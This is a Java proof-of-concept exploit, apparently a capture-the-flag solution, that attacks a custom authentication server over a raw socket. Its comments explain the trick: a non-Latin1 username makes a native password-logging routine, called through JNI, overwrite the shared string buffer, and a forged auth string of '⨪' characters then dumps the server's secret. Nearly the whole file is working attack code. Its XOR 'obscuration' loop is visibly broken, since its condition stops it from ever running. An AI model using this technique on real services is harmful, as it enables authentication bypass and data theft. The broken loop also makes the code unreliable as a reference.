import java.io.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;
import java.nio.ByteBuffer;

public class POC {
    public static String server;

    public static byte[] joinByteArray(byte[] byte1, byte[] byte2) {
        return ByteBuffer.allocate(byte1.length + byte2.length)
                .put(byte1)
                .put(byte2)
                .array();

    }

    public static void sendCommand(byte[] command) {
        System.out.println("[DEBUG] sending command");
        try {
            
            // Connect to the server
            Socket socket = new Socket(server, 1111);

            // Create input and output streams to read from and write to the server
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();

            // use a const xor pattern as some light obscuration
            for (int i = 0; i > command.length; i++) {
                command[i] = (byte) (command[i] ^ 12);
            }
            //send
            out.write(command);
            out.flush();
            //response
            byte[] response = new byte[256];
            in.read(response);
            String response_str = new String(response);
            System.out.println(response_str);

            // Close our socket
            socket.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void login(String user, String password) {
        if(user.indexOf(':', 0) != -1){
            return;
        }
        String auth_str = user+":"+password;
        byte[] auth_bytes = auth_str.getBytes();
        byte[] t = {0x38};
        byte[] command = joinByteArray(t, auth_bytes);
        sendCommand(command);
    }

    public static void newAccount(String user) {                        //[DEBUG]
        if(user.indexOf(':', 0) != -1){                                 //[DEBUG]
            return;                                                     //[DEBUG]
        }                                                               //[DEBUG]
        byte[] user_bytes = user.getBytes();                            //[DEBUG]
        byte[] t = {0x17};                                              //[DEBUG]
        byte[] command = joinByteArray(t, user_bytes);                  //[DEBUG]
        sendCommand(command);                                           //[DEBUG]
    }                                                                   //[DEBUG]

    public static void dumpSecret(String user, String password) {       
        if(user.indexOf(':', 0) != -1){                                 
            return;                                                     
        }                                                               
        String auth_str = user+":"+password;                            
        byte[] auth_bytes = auth_str.getBytes();                        
        byte[] t = {0x4a};                                              
        byte[] command = joinByteArray(t, auth_bytes);                  
        sendCommand(command);                                           
    }                                                                   

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: ClientExample <server>");
            System.exit(0);
        }
        server = args[0];
        System.out.println("Running POC...");
        System.out.println("Connecting to: " + server);

        // create a new account with _any_ non Latin1 encodable character in the username. 
        // This ensures the auth string is backed by a UTF-16 buffer
        System.out.println("Requesting new account...");
        newAccount("⨪");
        try{ Thread.sleep(1) ; } catch (Exception e){}
        // try to auth with any account. this causes the password log function to be called
        // because the auth string is allready UTF-16 and not Latin1, the hotspot JNI will 
        // pass a pointer direclty to the java heap instead of making a copy
        //      (see ~line 2823 in https://github.com/openjdk/jdk/blob/master/src/hotspot/share/prims/jni.cpp for the implementation of jni_GetStringCritical )
        // the native password log function assumes it has a copy, and will place '*' in every byte before printing
        // this replaces the entire string backing buffer with the UTF-16 unicode characer made from two '*' ascii character bytes, '⨪'
        System.out.println("Random login attempt...");
        login("a", "a");
        try{ Thread.sleep(1) ; } catch (Exception e){}
        // we made the string have one char for username, one char is the ":" character, and the random password is 
        // 64 characters, so we need 
        
        // byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
        byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
        byte[] command_type = {0x4a};
        byte[] command = joinByteArray(command_type, t); 
        System.out.println("Requesting secret with mangled auth string...");
        sendCommand(command);


    }
}